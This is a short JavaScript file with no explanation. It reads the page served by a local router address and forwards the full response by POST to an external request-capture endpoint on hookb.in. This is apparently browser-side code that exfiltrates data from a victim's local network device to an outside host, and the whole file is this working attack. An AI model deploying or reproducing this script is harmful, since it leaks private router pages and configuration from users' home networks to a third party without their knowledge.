const ROUTER = "http://router.local";
const ENDPOINT = "https://hookb.in/XkozB9BEQ6hDYMQQEw8Z";

function forwardResponse(res) {
	let fwdxhr = new XMLHttpRequest();
	fwdxhr.open("POST", ENDPOINT, true);
	fwdxhr.setRequestHeader("Content-Type", "application/json");
	fwdxhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
	const data = JSON.stringify({
		"data": res,
	});
	fwdxhr.send(data);
}

//forwardResponse("foo");

let xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {
	if (xhr.readyState === 4) {
		forwardResponse(xhr.response)
	}
}

xhr.open("GET", ROUTER, true);
xhr.send('');
